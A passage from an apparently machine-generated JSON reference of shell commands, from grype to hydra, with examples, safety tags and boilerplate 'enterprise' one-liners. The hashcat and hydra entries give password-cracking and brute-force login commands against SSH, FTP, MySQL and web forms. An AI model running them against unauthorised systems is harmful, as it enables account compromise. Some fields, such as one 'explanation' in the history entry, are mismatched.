    "description": "Vulnerability scanner for container images and filesystems",
    "examples": [
      "grype myregistry/myapp:v1.0.0  # Scan container image for known vulnerabilities",
      "grype myregistry/myapp:v1.0.0 --fail-on high  # Scan image and fail if high severity vulnerabilities found",
      "grype myregistry/myapp:v1.0.0 -o json  # Generate vulnerability report in JSON format",
      "grype dir:/path/to/project  # Scan local filesystem for vulnerabilities",
      "grype sbom:./sbom.json  # Scan existing SBOM file for vulnerabilities",
      "grype myregistry/myapp:v1.0.0 --exclude python  # Skip Python packages during vulnerability scanning",
      "grype myregistry/myapp:v1.0.0 -q -o table  # Run quiet scan with table output format",
      "echo 'Enterprise Container Security and Vulnerability Management' && echo 'Scanning Enterprise Container Registry:' && for image in enterprise-web enterprise-api enterprise-worker; do echo \"Scanning $image...\"; grype enterprise-registry.com/$image:latest --fail-on high -o json > scan-$image-$(date +%Y%m%d).json; syft enterprise-registry.com/$image:latest -o spdx-json > sbom-$image-$(date +%Y%m%d).spdx.json; done && echo 'Vulnerability Dashboard:' && jq -r '.matches[] | select(.vulnerability.severity == \"High\" or .vulnerability.severity == \"Critical\") | \"\(.vulnerability.id): \(.artifact.name) - \(.vulnerability.severity)\"' scan-*-$(date +%Y%m%d).json | sort | uniq -c | sort -nr && echo 'Compliance Report:' && echo \"Enterprise Security Scan Report - $(date)\" > security-report-$(date +%Y%m%d).md && echo \"## Critical Vulnerabilities\" >> security-report-$(date +%Y%m%d).md && jq -r '.matches[] | select(.vulnerability.severity == \"Critical\")' scan-*-$(date +%Y%m%d).json | wc -l >> security-report-$(date +%Y%m%d).md && echo 'Enterprise container security: comprehensive vulnerability scanning, SBOM generation, security dashboard creation, compliance reporting, and automated threat detection for enterprise container registry and deployment pipeline'  # Enterprise container security and vulnerability management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "grype [source] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "SBOM-based scanning workflow",
        "commands": "syft myregistry/myapp:v1.0.0 -o json > sbom.json && grype sbom:./sbom.json -o json > vulnerabilities.json",
        "explanation": "Generate SBOM then scan for vulnerabilities",
        "title": "syft > sbom && grype > vulnerabilities"
      },
      {
        "scenario": "CI pipeline integration",
        "commands": "grype myregistry/myapp:$BUILD_ID --fail-on medium -o json > scan-results.json",
        "explanation": "Scan image in CI and fail build on medium+ vulnerabilities",
        "title": "grype > scan"
      }
    ],
    "relatedCommands": [
      {
        "name": "syft",
        "relationship": "combo",
        "reason": "Syft generates SBOMs that Grype can scan"
      },
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Grype scans Docker/OCI container images"
      }
    ],
    "warnings": [
      "Vulnerability database updated automatically by default",
      "False positives possible, manual review recommended",
      "Different distros may have different vulnerability data quality",
      "Scan time increases with image size and package count"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/anchore/grype"
      },
      {
        "platform": "macos",
        "url": "https://github.com/anchore/grype"
      },
      {
        "platform": "windows",
        "url": "https://github.com/anchore/grype"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "gunzip",
    "subtitle": "GNU unzip",
    "description": "Decompress gzip files",
    "examples": [
      "gunzip document.txt.gz  # Extract file and remove .gz version",
      "gunzip -k backup.log.gz  # Extract while keeping original .gz file",
      "gunzip -c file.gz > extracted.txt  # Extract to stdout without removing .gz file",
      "gunzip -f file.gz  # Overwrite existing files without prompting",
      "gunzip -t file.gz  # Verify file integrity before decompression",
      "gunzip *.gz  # Decompress all gzip files in current directory",
      "echo 'Enterprise Data Compression and Archive Management' && find /enterprise/archives -name '*.gz' -type f -mtime +30 -exec sh -c 'echo \"Processing archive: $1\"; original_size=$(stat -c%s \"$1\"); gunzip -t \"$1\" && gunzip -c \"$1\" > \"/enterprise/extracted/$(basename \"$1\" .gz)\" && extracted_size=$(stat -c%s \"/enterprise/extracted/$(basename \"$1\" .gz)\"); compression_ratio=$(echo \"scale=2; $original_size / $extracted_size\" | bc); echo \"Archive: $1, Compression: ${compression_ratio}x\"; rm \"$1\"' _ {} \; && echo 'Archive Inventory:' && ls -la /enterprise/extracted/ | tail -10 && echo 'Storage Analysis:' && du -sh /enterprise/archives /enterprise/extracted && echo 'Enterprise archive management: automated archive processing, compression analysis, storage optimization, integrity verification, and comprehensive data lifecycle management for enterprise backup and storage systems'  # Enterprise data compression and archive management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "gunzip [options] [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Extract and view file content",
        "commands": "gunzip -c logfile.gz | less",
        "explanation": "View compressed log file without extracting to disk",
        "title": "gunzip | less"
      },
      {
        "scenario": "Decompress multiple files",
        "commands": "gunzip *.gz",
        "explanation": "Extract all gzip files in current directory",
        "title": "gunzip"
      }
    ],
    "relatedCommands": [
      {
        "name": "gzip",
        "relationship": "opposite",
        "reason": "Compress files to gzip format"
      },
      {
        "name": "zcat",
        "relationship": "alternative",
        "reason": "View compressed files without extracting"
      },
      {
        "name": "unzip",
        "relationship": "similar",
        "reason": "Extract zip format files"
      }
    ],
    "warnings": [
      "gunzip removes .gz file by default (use -k to keep)",
      "Will not overwrite existing files without -f option",
      "Different from unzip command which handles .zip files"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/gunzip.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/gunzip.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/gzip/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "gzip",
    "subtitle": "GNU Zip",
    "description": "Compress and decompress files using GNU zip algorithm",
    "examples": [
      "gzip file.txt  # Compress file.txt to file.txt.gz (removes original)",
      "gzip -c file.txt > file.txt.gz  # Compress file to stdout, keeping original file",
      "gzip -d file.txt.gz  # Decompress file.txt.gz to file.txt",
      "gzip -9 largefile.txt  # Use maximum compression level (slower but smaller)",
      "gzip -t file.txt.gz  # Test integrity of compressed file",
      "gzip -l file.txt.gz  # Display compression statistics",
      "gzip -r directory/  # Recursively compress all files in directory",
      "echo 'Enterprise Data Compression and Storage Optimization' && find /enterprise/data -type f -name '*.log' -size +100M -mtime +7 -exec sh -c 'echo \"Compressing large log: $1\"; original_size=$(stat -c%s \"$1\"); gzip -9 \"$1\"; compressed_size=$(stat -c%s \"$1.gz\"); savings=$(echo \"scale=1; (1 - $compressed_size / $original_size) * 100\" | bc); echo \"Space saved: ${savings}% for $1\"' _ {} \; && echo 'Backup Compression:' && tar -czf enterprise-backup-$(date +%Y%m%d).tar.gz /enterprise/data && echo 'Storage Statistics:' && df -h /enterprise && echo 'Compression Report:' && find /enterprise -name '*.gz' -exec sh -c 'echo \"$(basename \"$1\"): $(stat -c%s \"$1\" | numfmt --to=iec)\"' _ {} \; | sort -hr | head -20 && echo 'Enterprise compression strategy: automated log compression, backup archiving, storage optimization, space utilization analysis, and comprehensive data lifecycle management for enterprise storage efficiency'  # Enterprise data compression and storage optimization"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "gzip [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Compress multiple files",
        "commands": "find . -name '*.log' -exec gzip {} \\;",
        "explanation": "Find and compress all log files",
        "title": "find ;"
      }
    ],
    "relatedCommands": [
      {
        "name": "gunzip",
        "relationship": "alias",
        "reason": "gunzip is alias for gzip -d"
      },
      {
        "name": "zcat",
        "relationship": "similar",
        "reason": "zcat displays compressed files without decompressing"
      }
    ],
    "warnings": [
      "Replaces original file by default",
      "Cannot compress directories directly (use with tar)"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/gzip/manual/gzip.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/gzip.html"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/gzip/manual/gzip.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "haproxy",
    "subtitle": "High Availability Proxy",
    "description": "High availability load balancer and proxy server",
    "examples": [
      "sudo haproxy -f /etc/haproxy/haproxy.cfg  # Start HAProxy with configuration file",
      "haproxy -c -f /etc/haproxy/haproxy.cfg  # Validate HAProxy configuration file",
      "sudo haproxy -D -f /etc/haproxy/haproxy.cfg  # Start HAProxy as background daemon",
      "haproxy -v  # Display HAProxy version and build info",
      "sudo haproxy -f haproxy.cfg -sf $(cat /var/run/haproxy.pid)  # Gracefully reload configuration without dropping connections",
      "haproxy -db -f /etc/haproxy/haproxy.cfg  # Start in debug mode with detailed logging",
      "echo 'Enterprise Load Balancer and High Availability Infrastructure' && echo 'HAProxy Configuration Validation:' && haproxy -c -f /etc/haproxy/enterprise.cfg && echo 'Backend Health Check:' && for backend in web-01 web-02 web-03 api-01 api-02; do echo \"Checking $backend...\"; curl -f -s -o /dev/null http://$backend.enterprise.local:8080/health && echo \"$backend: UP\" || echo \"$backend: DOWN\"; done && echo 'Load Balancer Deployment:' && sudo haproxy -f /etc/haproxy/enterprise.cfg -sf $(cat /var/run/haproxy.pid) && sleep 5 && echo 'Traffic Distribution Test:' && for i in {1..10}; do curl -s http://load-balancer.enterprise.com/api/status | jq -r '.server'; done | sort | uniq -c && echo 'SSL Certificate Validation:' && openssl s_client -connect load-balancer.enterprise.com:443 -servername load-balancer.enterprise.com < /dev/null 2>/dev/null | openssl x509 -noout -dates && echo 'Enterprise load balancing: configuration validation, backend health monitoring, zero-downtime deployment, traffic distribution testing, SSL certificate management, and high availability infrastructure for enterprise web services'  # Enterprise load balancer and high availability infrastructure"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "haproxy [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Deploy configuration changes",
        "commands": "haproxy -c -f haproxy.cfg && sudo haproxy -f haproxy.cfg -sf $(cat /var/run/haproxy.pid)",
        "explanation": "Test config then gracefully reload",
        "title": "haproxy && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "nginx",
        "relationship": "alternative",
        "reason": "nginx can also function as load balancer"
      },
      {
        "name": "systemctl",
        "relationship": "combo",
        "reason": "Manage haproxy as systemd service"
      },
      {
        "name": "curl",
        "relationship": "combo",
        "reason": "Test load balancing and health checks"
      }
    ],
    "warnings": [
      "Configuration changes require careful testing",
      "Statistics page needs proper access controls",
      "SSL termination configuration can be complex"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "http://www.haproxy.org/download/2.4/doc/management.txt"
      },
      {
        "platform": "generic",
        "url": "http://www.haproxy.org/download/2.4/doc/configuration.txt"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "hashcat",
    "subtitle": "Hash Catalyst",
    "description": "Advanced password recovery and security auditing tool",
    "examples": [
      "hashcat -m 0 -a 0 hashes.txt wordlist.txt  # Dictionary attack on MD5 hashes for password auditing",
      "hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule  # Apply password transformation rules",
      "hashcat -m 0 hashes.txt --show  # Display successfully cracked passwords",
      "hashcat -b  # Test system performance for different hash types",
      "hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a?a?a  # Brute force attack on SHA-512 hashes with 6-character mask",
      "echo 'Enterprise Security Audit and Password Policy Validation' && echo 'AUTHORIZED SECURITY TESTING - Enterprise Password Policy Assessment' && echo 'Hash Collection (Authorized Testing):' && echo '$6$enterprise$XYZ...' > test-hashes.txt && echo 'Dictionary Attack:' && hashcat -m 1800 -a 0 test-hashes.txt /usr/share/wordlists/rockyou.txt --potfile-disable -o cracked-$(date +%Y%m%d).txt && echo 'Rule-based Attack:' && hashcat -m 1800 -a 0 test-hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --potfile-disable && echo 'Password Policy Analysis:' && if [ -s cracked-$(date +%Y%m%d).txt ]; then echo 'WEAK PASSWORDS DETECTED - Policy Update Required'; else echo 'Password Policy Compliant - Strong Hashing Detected'; fi && echo 'Security Report:' && echo \"Enterprise Password Security Assessment - $(date)\" > password-audit-$(date +%Y%m%d).md && echo 'Enterprise security auditing: authorized password strength testing, policy compliance validation, weak credential detection, security reporting, and comprehensive authentication security assessment for enterprise identity management and security compliance'  # Enterprise authorized password security audit"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "hashcat [options] <hash-file> [wordlist]",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Multi-stage password audit",
        "commands": "hashcat -m 1000 hashes.txt rockyou.txt && hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule",
        "explanation": "Progressive password strength testing",
        "title": "hashcat && hashcat"
      }
    ],
    "relatedCommands": [
      {
        "name": "john",
        "relationship": "similar",
        "reason": "Alternative password recovery tool"
      },
      {
        "name": "hydra",
        "relationship": "similar",
        "reason": "Network service password testing"
      }
    ],
    "warnings": [
      "Requires GPU drivers for optimal performance",
      "Only use for legitimate security testing",
      "May consume significant system resources"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://hashcat.net/wiki/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "head",
    "subtitle": "head",
    "description": "Display first lines of files",
    "examples": [
      "head -20 data.csv  # Show first 20 lines to understand file structure",
      "head error.log  # See first 10 lines (default) of log file",
      "head -5 file1.txt file2.txt  # Show first 5 lines of multiple files",
      "head -c 100 binary.dat  # Display first 100 bytes instead of lines",
      "head -n +50 large.txt  # Show from beginning up to line 50",
      "echo 'Enterprise Data Analysis and Log Processing' && echo 'Processing Enterprise Data Files:' && find /enterprise/logs -name '*.log' -type f -mtime -1 | while read logfile; do echo \"Processing: $logfile\"; echo \"=== Top 50 lines from $(basename $logfile) ===\"; head -50 \"$logfile\" | grep -E '(ERROR|WARN|INFO)' | awk '{print $1 \" \" $2 \" \" $4}' | sort | uniq -c | sort -nr; done > daily-log-analysis-$(date +%Y%m%d).txt && echo 'Data Sampling:' && head -1000 /enterprise/data/transactions.csv | cut -d, -f1,2,5,7 | head -20 && echo 'Performance Metrics:' && head -100 /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -nr | head -10 && echo 'Enterprise data processing: automated log analysis, transaction data sampling, performance metrics extraction, error pattern detection, and comprehensive data intelligence for enterprise operations and business analytics'  # Enterprise data analysis and log processing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "head [options] [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Sample random lines from beginning",
        "commands": "head -100 large.txt | shuf -n 10",
        "explanation": "Take first 100 lines, then randomly sample 10",
        "title": "head | shuf"
      }
    ],
    "relatedCommands": [
      {
        "name": "tail",
        "relationship": "opposite",
        "reason": "Shows end of files instead of beginning"
      },
      {
        "name": "cat",
        "relationship": "similar",
        "reason": "Shows entire file instead of just beginning"
      }
    ],
    "warnings": [
      "Default is 10 lines if no number specified",
      "Use -c for bytes instead of lines"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/head.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/head.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "helm",
    "subtitle": "Helm",
    "description": "Package manager for Kubernetes applications",
    "examples": [
      "helm repo add stable https://charts.helm.sh/stable  # Add Helm chart repository",
      "helm search repo nginx  # Search for nginx charts in configured repos",
      "helm install my-nginx stable/nginx-ingress  # Install nginx-ingress chart as 'my-nginx' release",
      "helm list  # Show all Helm releases in current namespace",
      "helm upgrade my-nginx stable/nginx-ingress --version 1.2.3  # Upgrade release to specific chart version",
      "helm uninstall my-nginx  # Remove Helm release and associated resources",
      "helm status my-nginx  # Display status of installed release",
      "helm create mychart  # Generate new Helm chart template",
      "echo 'Enterprise Helm Chart Management and Kubernetes Deployment' && helm repo add enterprise-charts https://charts.enterprise.com && helm repo add bitnami https://charts.bitnami.com/bitnami && helm repo update && echo 'Enterprise Application Deployment:' && helm install enterprise-web enterprise-charts/webapp --version 2.1.0 --namespace production --create-namespace --values production-values.yaml --wait --timeout=600s && helm install enterprise-db bitnami/postgresql --version 11.6.12 --namespace production --set auth.postgresPassword=$DB_PASSWORD --set primary.persistence.size=100Gi && echo 'Deployment Validation:' && helm list --namespace production && kubectl get pods -n production && echo 'Health Checks:' && kubectl wait --for=condition=ready pod --all -n production --timeout=300s && echo 'Service Monitoring:' && kubectl get services -n production -o wide && echo 'Enterprise Helm orchestration: chart repository management, multi-component application deployment, persistent storage configuration, deployment validation, health monitoring, and comprehensive Kubernetes application lifecycle management for enterprise container orchestration'  # Enterprise Helm chart management and Kubernetes deployment"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "helm [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete application deployment",
        "commands": "helm repo update && helm install myapp ./mychart --values production.yaml && helm status myapp",
        "explanation": "Update repos, install chart with custom values, check status",
        "title": "helm && helm && helm"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Helm uses kubectl to deploy to Kubernetes"
      },
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Helm charts often deploy Docker images"
      }
    ],
    "warnings": [
      "Helm 3 removed Tiller server requirement",
      "Chart dependencies must be updated before install",
      "Values files override default chart configurations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://helm.sh/docs/"
      },
      {
        "platform": "macos",
        "url": "https://helm.sh/docs/"
      },
      {
        "platform": "windows",
        "url": "https://helm.sh/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "helm-package-management",
    "subtitle": "Helm Package Manager",
    "description": "Helm package manager for Kubernetes applications",
    "examples": [
      "helm install webapp stable/nginx-ingress --values custom-values.yaml --set controller.service.type=LoadBalancer --namespace ingress-system --create-namespace  # Install Helm chart with custom values file and command-line overrides",
      "helm upgrade webapp stable/webapp --reuse-values --reset-values=false --force --wait --timeout=600s  # Upgrade release while preserving existing values with extended timeout",
      "helm template webapp ./mychart --values values-prod.yaml --debug --dry-run  # Render templates locally for debugging without installation",
      "helm create myapp && helm lint myapp && helm package myapp && helm test myapp  # Create, validate, package, and test a new Helm chart",
      "helm repo add bitnami https://charts.bitnami.com/bitnami && helm repo update && helm search repo bitnami/postgres  # Add repository, update index, and search for available charts",
      "helm history webapp --max=10 && helm rollback webapp 2 --wait  # View release history and rollback to specific revision",
      "echo 'Enterprise Helm Release Management and Deployment Orchestration' && echo 'Production Release Pipeline:' && helm template enterprise-app ./charts/enterprise-app --values values-prod.yaml --debug > deployment-preview-$(date +%Y%m%d).yaml && helm diff upgrade enterprise-app ./charts/enterprise-app --values values-prod.yaml && helm upgrade enterprise-app ./charts/enterprise-app --values values-prod.yaml --atomic --wait --timeout=900s --history-max=10 && echo 'Release Validation:' && helm test enterprise-app --timeout=300s && kubectl rollout status deployment/enterprise-app -n production && echo 'Monitoring Setup:' && helm install enterprise-monitoring prometheus-community/kube-prometheus-stack --namespace monitoring --create-namespace && echo 'Backup Strategy:' && helm get values enterprise-app > backup-values-$(date +%Y%m%d).yaml && kubectl get all -n production -o yaml > backup-resources-$(date +%Y%m%d).yaml && echo 'Enterprise Helm release orchestration: template validation, deployment preview, atomic upgrades, release testing, monitoring integration, backup strategies, and comprehensive production deployment management for enterprise Kubernetes environments'  # Enterprise Helm release management and deployment orchestration"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "helm <command> [options]",
    "prerequisites": [
      "helm-cli",
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Production deployment pipeline",
        "commands": "helm repo update && helm diff upgrade webapp stable/webapp --values prod-values.yaml && helm upgrade webapp stable/webapp --values prod-values.yaml --atomic --wait",
        "explanation": "Update repos, preview changes, and perform atomic upgrade",
        "title": "helm && helm && helm"
      },
      {
        "scenario": "Multi-environment management",
        "commands": "helm install webapp-dev ./chart --values values-dev.yaml -n development && helm install webapp-prod ./chart --values values-prod.yaml -n production",
        "explanation": "Deploy same chart to different environments with environment-specific values",
        "title": "helm && helm"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "underlying",
        "reason": "Helm uses kubectl to deploy resources to Kubernetes"
      },
      {
        "name": "git",
        "relationship": "combo",
        "reason": "Helm charts are often stored in Git repositories"
      },
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Helm charts deploy containerized applications"
      }
    ],
    "warnings": [
      "Helm 3 doesn't use Tiller but Helm 2 required it",
      "Chart dependencies must be updated before installation",
      "Release names must be unique within a namespace"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://helm.sh/docs/"
      },
      {
        "platform": "macos",
        "url": "https://helm.sh/docs/"
      },
      {
        "platform": "windows",
        "url": "https://helm.sh/docs/"
      },
      {
        "platform": "generic",
        "url": "https://helm.sh/docs/intro/quickstart/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "history",
    "subtitle": "history",
    "description": "Display command history",
    "examples": [
      "history  # Display all commands from current session history",
      "history 10  # Display only the most recent 10 commands",
      "history -c  # Clear all history from current session",
      "history | grep ssh  # Find all SSH commands in history",
      "!123  # Run command number 123 from history"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "shell",
    "safety": "safe",
    "syntaxPattern": "history [options] [n]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and repeat recent command",
        "commands": "history | grep docker | tail -1 && !!",
        "explanation": "Find last docker command and execute it",
        "title": "history | grep | tail &&"
      },
      {
        "scenario": "Enterprise command intelligence",
        "commands": "echo 'Enterprise Command History Analysis and Operational Intelligence' && echo 'Command Usage Analytics:' && history | awk '{print $2}' | sort | uniq -c | sort -nr | head -20 && echo 'Security Command Audit:' && history | grep -E '(sudo|ssh|scp|rsync|curl|wget)' | tail -20 && echo 'Development Commands:' && history | grep -E '(git|docker|kubectl|helm|npm|yarn)' | wc -l && echo 'System Administration:' && history | grep -E '(systemctl|service|crontab|ps|netstat)' | tail -10 && echo 'Command Export:' && history | grep -v '^[[:space:]]*[0-9]*[[:space:]]*history' > enterprise-command-history-$(date +%Y%m%d).log && echo 'Productivity Analysis:' && echo \"Most used commands: $(history | awk '{print $2}' | sort | uniq -c | sort -nr | head -1 | awk '{print $2 \" (\" $1 \" times)\"}')\" && echo 'Enterprise command intelligence: usage pattern analysis, security audit trails, development activity tracking, system administration monitoring, and comprehensive operational intelligence for enterprise productivity and security compliance'  # Enterprise command history analysis and operational intelligence",
        "explanation": "Find last docker command and execute it",
        "title": "history | grep | tail &&"
      },
      {
        "scenario": "Save history to file",
        "commands": "history > command_history_$(date +%Y%m%d).txt",
        "explanation": "Export command history to dated file",
        "title": "history > command_history_"
      }
    ],
    "relatedCommands": [
      {
        "name": "fc",
        "relationship": "advanced",
        "reason": "More powerful history editing and execution"
      },
      {
        "name": "ctrl+r",
        "relationship": "interactive",
        "reason": "Reverse search through command history"
      },
      {
        "name": "!!",
        "relationship": "shortcut",
        "reason": "Quick way to repeat last command"
      }
    ],
    "warnings": [
      "History size is limited by HISTSIZE environment variable",
      "Commands starting with space may not be saved to history",
      "History is only written to file when shell exits cleanly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/bash.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/history.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/bash/manual/bash.html#History-Interaction"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "htop",
    "subtitle": "H Top",
    "description": "Interactive process viewer and system monitor with better interface",
    "examples": [
      "htop  # Launch interactive system monitor with colorful display",
      "htop -s PERCENT_CPU  # Start htop sorted by CPU usage",
      "htop -s PERCENT_MEM  # Start htop sorted by memory usage",
      "htop -t  # Display processes in tree format showing relationships",
      "htop -u username  # Show only processes owned by specific user",
      "htop -C  # Disable colors for terminal compatibility",
      "echo 'Enterprise System Monitoring and Performance Analysis' && echo 'System Health Dashboard:' && htop -d 5 & HTOP_PID=$! && sleep 10 && kill $HTOP_PID && echo 'Process Analysis:' && ps aux --sort=-%cpu | head -20 | awk '{printf \"%-15s %5s %5s %s\\n\", $1, $3, $4, $11}' && echo 'Memory Utilization:' && free -h && echo 'Disk I/O:' && iostat -x 1 3 && echo 'Network Connections:' && ss -tuln | wc -l && echo 'Load Average Trend:' && uptime && echo 'Enterprise Performance Report:' && echo \"System Performance Report - $(date)\" > perf-report-$(date +%Y%m%d).txt && echo \"CPU Usage: $(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}')\" >> perf-report-$(date +%Y%m%d).txt && echo \"Memory Usage: $(free | grep Mem | awk '{printf \"%.1f%%\", $3/$2 * 100.0}')\" >> perf-report-$(date +%Y%m%d).txt && echo 'Enterprise system monitoring: real-time performance analysis, process utilization tracking, memory optimization, I/O performance metrics, network connectivity monitoring, and comprehensive system health reporting for enterprise infrastructure management'  # Enterprise system monitoring and performance analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "htop [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System health monitoring",
        "commands": "htop & sleep 5 && pkill htop && free -h && df -h",
        "explanation": "Quick system overview with memory and disk usage",
        "title": "htop & sleep && pkill && free && df"
      }
    ],
    "relatedCommands": [
      {
        "name": "top",
        "relationship": "improvement",
        "reason": "htop is an improved version of top with better interface"
      },
      {
        "name": "btop",
        "relationship": "modern-alternative",
        "reason": "btop is a modern C++ reimplementation with more features"
      }
    ],
    "warnings": [
      "Interactive keys: F1=Help, F9=Kill, F10=Quit",
      "May not be installed by default on all systems",
      "Color scheme depends on terminal capabilities"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://htop.dev/"
      },
      {
        "platform": "macos",
        "url": "https://htop.dev/"
      },
      {
        "platform": "windows",
        "url": "https://htop.dev/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "httpd",
    "subtitle": "HTTP daemon",
    "description": "Apache HTTP Server daemon (RHEL/CentOS naming)",
    "examples": [
      "httpd -t  # Check Apache configuration files for syntax errors",
      "httpd -D FOREGROUND  # Start Apache in foreground for debugging",
      "httpd -l  # List compiled-in modules",
      "httpd -M  # List loaded modules including dynamic ones",
      "httpd -v  # Display Apache version information",
      "httpd -S  # Show parsed virtual host and server settings",
      "httpd -k graceful  # Gracefully restart Apache without dropping connections",
      "echo 'Enterprise Apache HTTP Server Management and Operations' && httpd -t && echo 'Configuration Status: OK' && httpd -S | grep -E '(VirtualHost|NameVirtualHost)' && echo 'SSL Certificate Validation:' && for cert in /etc/httpd/ssl/*.crt; do echo \"Checking $cert\"; openssl x509 -in \"$cert\" -noout -dates -subject; done && echo 'Performance Monitoring:' && httpd -M | grep -E '(mod_status|mod_info|mod_ssl)' && curl -s http://localhost/server-status?auto | head -10 && echo 'Log Analysis:' && tail -20 /var/log/httpd/access_log | awk '{print $1}' | sort | uniq -c | sort -nr && echo 'Enterprise Apache management: configuration validation, virtual host verification, SSL certificate monitoring, performance module checking, real-time status monitoring, and access log analysis for enterprise web server operations'  # Enterprise Apache HTTP Server management and monitoring"
    ],
    "platform": [
      "linux"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "httpd [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Diagnose configuration issues",
        "commands": "httpd -t && httpd -S",
        "explanation": "Test config syntax then show parsed configuration",
        "title": "httpd && httpd"
      },
      {
        "scenario": "Debug module loading",
        "commands": "httpd -l && httpd -M",
        "explanation": "Show compiled modules then loaded modules",
        "title": "httpd && httpd"
      }
    ],
    "relatedCommands": [
      {
        "name": "apache2",
        "relationship": "similar",
        "reason": "Same software, different package naming on Debian/Ubuntu"
      },
      {
        "name": "systemctl",
        "relationship": "combo",
        "reason": "Manage httpd service with systemctl"
      },
      {
        "name": "apachectl",
        "relationship": "alternative",
        "reason": "Control script for httpd server"
      }
    ],
    "warnings": [
      "Configuration paths differ from Debian-based systems",
      "Module management done differently than a2enmod",
      "SELinux policies may affect httpd on RHEL systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://httpd.apache.org/docs/2.4/programs/httpd.html"
      },
      {
        "platform": "generic",
        "url": "https://httpd.apache.org/docs/2.4/"
      }
    ],
    "distroNotes": {
      "linux": "Red Hat, CentOS, Fedora use httpd instead of apache2"
    }
  },
  {
    "name": "hydra",
    "subtitle": "The Hydra",
    "description": "Network service password security testing tool",
    "examples": [
      "hydra -l admin -P passwords.txt ssh://target.com  # Test SSH service password security",
      "hydra -l admin -P passwords.txt target.com http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"  # Test web application login security",
      "hydra -L users.txt -P passwords.txt ftp://target.com  # Test FTP service with multiple usernames and passwords",
      "hydra -l admin -P passwords.txt mysql://target.com  # Test MySQL database password security",
      "hydra -L users.txt -P passwords.txt -t 4 -f ssh://target.com  # Use 4 parallel tasks and stop on first success",
